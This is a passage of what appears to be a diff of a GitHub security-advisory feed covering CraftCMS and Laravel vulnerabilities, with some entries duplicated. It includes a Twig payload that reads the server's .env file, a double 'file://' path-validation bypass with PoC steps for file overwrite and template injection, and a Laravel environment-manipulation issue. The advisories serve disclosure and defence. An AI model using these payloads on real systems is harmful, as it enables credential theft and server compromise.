-<pre><code class="language-twig">{{ dataUrl('/var/www/web/.env') }}
-</code></pre>
-<ol start="2">
-<li>Trigger the corresponding notification email (e.g. by resetting a password)</li>
-<li>Receive the email and decode the base64 string</li>
-</ol>
-<p>Mail received:
-<img alt="Bildschirmfoto 2024-09-05 um 16 20 41" src="https://github.com/user-attachments/assets/24dc5196-6847-4006-b7ef-8cd10d659c30"></p>
-<p>Decoded string:
-<img alt="Bildschirmfoto 2024-09-05 um 16 28 24" src="https://github.com/user-attachments/assets/1913a475-5277-49b9-9210-2f3fcd3b9bf1"></p>
-<h3 id="impact">Impact</h3>
-<ol>
-<li><p>Exposure of Sensitive Information: Arbitrary file read can lead to the exposure of sensitive data such as configuration files (e.g., /etc/passwd, .env, config.php), which may contain credentials, API keys, or database passwords. This can provide the attacker with further access to the system or connected services.</p>
-</li>
-<li><p>Privilege Escalation: If the attacker is able to read files that contain privileged information, such as credentials for other systems or applications, they may be able to escalate their privileges beyond what the web admin role originally allowed, potentially gaining full control over the server or other related systems.</p>
-</li>
-<li><p>Server Compromise: Access to files like SSH keys, private certificates, or system configuration files can lead to the complete compromise of the underlying server. With this information, an attacker could remotely log in to the server or impersonate it in secure communications.</p>
-</li>
-<li><p>Exfiltration of User Data: The ability to read arbitrary files may allow an attacker to access user data, such as stored passwords, session tokens, or private information (like uploaded files or logs), leading to a breach of confidentiality and violating privacy regulations (e.g., GDPR).</p>
-</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-cw6g-qmjq-6w2w">https://github.com/craftcms/cms/security/advisories/GHSA-cw6g-qmjq-6w2w</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52292">https://nvd.nist.gov/vuln/detail/CVE-2024-52292</a></li>
-<li><a href="https://github.com/advisories/GHSA-cw6g-qmjq-6w2w">https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-13T14:15:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[craftcms/cms] Local File System Validation Bypass Leading to File Overwrite, Sensitive File Access, and Potential Code Execution]]></title>
-        <id>https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</id>
-        <link href="https://github.com/advisories/GHSA-jrh5-vhr9-qh7q"/>
-        <updated>2024-11-13T18:58:33.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A vulnerability in CraftCMS allows an attacker to bypass local file system validation by utilizing a double <code>file://</code> scheme (e.g., <code>file://file:////</code>). This enables the attacker to specify sensitive folders as the file system, leading to potential file overwriting through malicious uploads, unauthorized access to sensitive files, and, under certain conditions, remote code execution (RCE) via Server-Side Template Injection (SSTI) payloads.</p>
-<p>Note that this will only work if you have an authenticated administrator account with <a href="https://craftcms.com/docs/5.x/reference/config/general.html#allowadminchanges">allowAdminChanges enabled</a>.</p>
-<p><a href="https://craftcms.com/knowledge-base/securing-craft#set-allowAdminChanges-to-false-in-production">https://craftcms.com/knowledge-base/securing-craft#set-allowAdminChanges-to-false-in-production</a></p>
-<h3 id="details">Details</h3>
-<p>The issue lies in line 57 of <code>cms/src/helpers/FileHelper.php</code>, it only removes <code>file://</code> on the most left. It is trivial to bypass this sanitization by adding 2 <code>file://</code>, e.g. <code>file://file:////</code>.</p>
-<pre><code class="language-php">    public static function normalizePath($path, $ds = DIRECTORY_SEPARATOR): string
-    {
-        // Remove any file protocol wrappers
-        $path = StringHelper::removeLeft($path, 'file://');
-
-        // Is this a UNC network share path?
-        $isUnc = (str_starts_with($path, '//') || str_starts_with($path, '\\\\'));
-
-        // Normalize the path
-        $path = parent::normalizePath($path, $ds);
-
-        // If it is UNC, add those slashes back in front
-        if ($isUnc) {
-            $path = $ds . $ds . ltrim($path, $ds);
-        }
-
-        return $path;
-    }
-</code></pre>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Sign in with an admin account and navigate to <code>Settings → Assets</code>, then create a new volume.</li>
-<li>n the Asset Filesystem section, create a new file system and set the Base Path to <code>file://file:////vendor</code>.
-Without the prefix, the selection fails.
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/1.png">
-With the double <code>file://</code> prefix, the selection succeeds.
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/2.png"></li>
-<li>Access Assets from the left navigation bar, then upload a file into this volume.
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/3.png"></li>
-<li>The file is successfully uploaded and stored in the sensitive folder specified (e.g., <code>/vendor</code>).
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/4.png"></li>
-<li>SSTI payloads can be uploaded to <code>/templates</code> folder, though full code execution was not achieved during testing, some payloads were still successful, leading to sensitive information disclosure, among other potential impacts.
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/7306f23f208e8e8dff48d65a0dc02dc.png"></li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>Attackers who compromise an admin account(The admin user is not equal to the server owner) can exploit this flaw to assign sensitive folders as the base path of the filesystem. For instance, if the path <code>/templates</code> is specified (e.g., <code>file://file:////var/www/html/templates</code>), the attacker could upload SSTI payloads. While CraftCMS includes strict SSTI input sanitization, RCE may still be possible if the attacker can craft a valid payload, as seen in similar vulnerabilities (e.g., <a href="https://github.com/advisories/GHSA-44wr-rmwq-3phw">GHSA-44wr-rmwq-3phw</a>).</p>
-<p>Additionally, attackers can upload tampered files to overwrite critical web application files. By enabling public URLs for files in the specified filesystem, they can also retrieve sensitive files (e.g., configuration files from the local file system).</p>
-<p>Although the vulnerability is exploitable only in the authenticated users, configuration with <code>ALLOW_ADMIN_CHANGES=true</code>, there is still a potential security threat.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-jrh5-vhr9-qh7q">https://github.com/craftcms/cms/security/advisories/GHSA-jrh5-vhr9-qh7q</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52291">https://nvd.nist.gov/vuln/detail/CVE-2024-52291</a></li>
-<li><a href="https://github.com/advisories/GHSA-jrh5-vhr9-qh7q">https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-13T14:12:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[craftcms/cms] Local File System Validation Bypass Leading to File Overwrite, Sensitive File Access, and Potential Code Execution]]></title>
-        <id>https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</id>
-        <link href="https://github.com/advisories/GHSA-jrh5-vhr9-qh7q"/>
-        <updated>2024-11-13T18:58:33.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A vulnerability in CraftCMS allows an attacker to bypass local file system validation by utilizing a double <code>file://</code> scheme (e.g., <code>file://file:////</code>). This enables the attacker to specify sensitive folders as the file system, leading to potential file overwriting through malicious uploads, unauthorized access to sensitive files, and, under certain conditions, remote code execution (RCE) via Server-Side Template Injection (SSTI) payloads.</p>
-<p>Note that this will only work if you have an authenticated administrator account with <a href="https://craftcms.com/docs/5.x/reference/config/general.html#allowadminchanges">allowAdminChanges enabled</a>.</p>
-<p><a href="https://craftcms.com/knowledge-base/securing-craft#set-allowAdminChanges-to-false-in-production">https://craftcms.com/knowledge-base/securing-craft#set-allowAdminChanges-to-false-in-production</a></p>
-<h3 id="details">Details</h3>
-<p>The issue lies in line 57 of <code>cms/src/helpers/FileHelper.php</code>, it only removes <code>file://</code> on the most left. It is trivial to bypass this sanitization by adding 2 <code>file://</code>, e.g. <code>file://file:////</code>.</p>
-<pre><code class="language-php">    public static function normalizePath($path, $ds = DIRECTORY_SEPARATOR): string
-    {
-        // Remove any file protocol wrappers
-        $path = StringHelper::removeLeft($path, 'file://');
-
-        // Is this a UNC network share path?
-        $isUnc = (str_starts_with($path, '//') || str_starts_with($path, '\\\\'));
-
-        // Normalize the path
-        $path = parent::normalizePath($path, $ds);
-
-        // If it is UNC, add those slashes back in front
-        if ($isUnc) {
-            $path = $ds . $ds . ltrim($path, $ds);
-        }
-
-        return $path;
-    }
-</code></pre>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Sign in with an admin account and navigate to <code>Settings → Assets</code>, then create a new volume.</li>
-<li>n the Asset Filesystem section, create a new file system and set the Base Path to <code>file://file:////vendor</code>.
-Without the prefix, the selection fails.
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/1.png">
-With the double <code>file://</code> prefix, the selection succeeds.
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/2.png"></li>
-<li>Access Assets from the left navigation bar, then upload a file into this volume.
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/3.png"></li>
-<li>The file is successfully uploaded and stored in the sensitive folder specified (e.g., <code>/vendor</code>).
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/4.png"></li>
-<li>SSTI payloads can be uploaded to <code>/templates</code> folder, though full code execution was not achieved during testing, some payloads were still successful, leading to sensitive information disclosure, among other potential impacts.
- <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/7306f23f208e8e8dff48d65a0dc02dc.png"></li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>Attackers who compromise an admin account(The admin user is not equal to the server owner) can exploit this flaw to assign sensitive folders as the base path of the filesystem. For instance, if the path <code>/templates</code> is specified (e.g., <code>file://file:////var/www/html/templates</code>), the attacker could upload SSTI payloads. While CraftCMS includes strict SSTI input sanitization, RCE may still be possible if the attacker can craft a valid payload, as seen in similar vulnerabilities (e.g., <a href="https://github.com/advisories/GHSA-44wr-rmwq-3phw">GHSA-44wr-rmwq-3phw</a>).</p>
-<p>Additionally, attackers can upload tampered files to overwrite critical web application files. By enabling public URLs for files in the specified filesystem, they can also retrieve sensitive files (e.g., configuration files from the local file system).</p>
-<p>Although the vulnerability is exploitable only in the authenticated users, configuration with <code>ALLOW_ADMIN_CHANGES=true</code>, there is still a potential security threat.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-jrh5-vhr9-qh7q">https://github.com/craftcms/cms/security/advisories/GHSA-jrh5-vhr9-qh7q</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52291">https://nvd.nist.gov/vuln/detail/CVE-2024-52291</a></li>
-<li><a href="https://github.com/advisories/GHSA-jrh5-vhr9-qh7q">https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-13T14:12:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[laravel/framework] Laravel environment manipulation via query string]]></title>
-        <id>https://github.com/advisories/GHSA-gv7v-rgg6-548h</id>
-        <link href="https://github.com/advisories/GHSA-gv7v-rgg6-548h"/>
-        <updated>2024-11-15T01:00:35.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>When the <code>register_argc_argv php</code> directive is set to <code>on</code> , and users call any URL with a special crafted query string, they are able to change the environment used by the framework when handling the request.</p>
-<h2 id="resolution">Resolution</h2>
-<p>The framework now ignores argv values for environment detection on non-cli SAPIs.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h">https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52301">https://nvd.nist.gov/vuln/detail/CVE-2024-52301</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/laravel/framework/CVE-2024-52301.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/laravel/framework/CVE-2024-52301.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-gv7v-rgg6-548h">https://github.com/advisories/GHSA-gv7v-rgg6-548h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gv7v-rgg6-548h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-12T22:08:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[laravel/framework] Laravel environment manipulation via query string]]></title>
-        <id>https://github.com/advisories/GHSA-gv7v-rgg6-548h</id>
-        <link href="https://github.com/advisories/GHSA-gv7v-rgg6-548h"/>
-        <updated>2024-11-15T01:00:35.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>When the <code>register_argc_argv php</code> directive is set to <code>on</code> , and users call any URL with a special crafted query string, they are able to change the environment used by the framework when handling the request.</p>
-<h2 id="resolution">Resolution</h2>
-<p>The framework now ignores argv values for environment detection on non-cli SAPIs.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h">https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52301">https://nvd.nist.gov/vuln/detail/CVE-2024-52301</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/laravel/framework/CVE-2024-52301.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/laravel/framework/CVE-2024-52301.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-gv7v-rgg6-548h">https://github.com/advisories/GHSA-gv7v-rgg6-548h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gv7v-rgg6-548h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-12T22:08:42.000Z</published>
     </entry>
 </feed>
